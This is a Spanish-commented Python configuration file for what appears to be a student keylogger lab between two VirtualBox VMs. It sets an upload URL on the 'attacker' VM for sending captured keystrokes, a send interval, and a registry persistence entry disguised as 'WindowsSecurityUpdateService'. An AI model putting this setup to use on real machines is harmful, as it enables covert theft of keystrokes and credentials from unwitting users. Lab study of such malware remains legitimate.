"""
config.py
Configuración central del Keylogger.
IMPORTANTE: Nunca subas claves reales al repositorio.
"""

# === Decisiones del proyecto ===
# SO objetivo: Windows 11
TARGET_OS = "Windows 11"

# Intervalo de envío en segundos (configurable y justificable)
SEND_INTERVAL = 20          # segundos - buen balance para pruebas

# === Red entre VMs (VirtualBox) ===
# Usaremos adaptador Host-Only (recomendado)
# Rango típico de VirtualBox Host-Only: 192.168.56.0/24
#
# IPs reales (corregidas):
#   VM Víctima (keylogger)   → 192.168.56.107   (Ethernet / Host-Only)
#   VM Atacante (receiver)   → 192.168.56.108   (Ethernet / Host-Only)
#
# Nota: Ambas VMs también tienen un segundo adaptador (Ethernet 2 / NAT) en 10.0.3.15
#       para acceso a internet. Usaremos las IPs 192.168.56.x para la comunicación del proyecto.
SERVER_URL = "http://192.168.56.108:5000/upload"

# Recuerda:
# - En la VM Atacante ejecuta: python receiver.py   (desde la carpeta src)
# - En la VM Víctima ejecuta:   python keylogger.py
# - El receptor debe estar corriendo primero.
# - La primera vez el keylogger genera secret.key (se comparte automáticamente por la carpeta Y:).
# - Reinicia el receptor después de que se genere la clave.

# Para montar la carpeta compartida usa (ejemplos):
# net use Y: \\vboxsrv\Proyecto /persistent:yes
# cd Y:
# cd src
#
# O accede directamente sin mapear:
# cd \\vboxsrv\Proyecto
# cd src

# Nombre que aparecerá en el registro de Windows (persistencia)
APP_NAME = "WindowsSecurityUpdateService"

# Archivo de clave (se genera una vez)
KEY_FILE = "secret.key"

# Nivel de logging
LOG_LEVEL = "INFO"
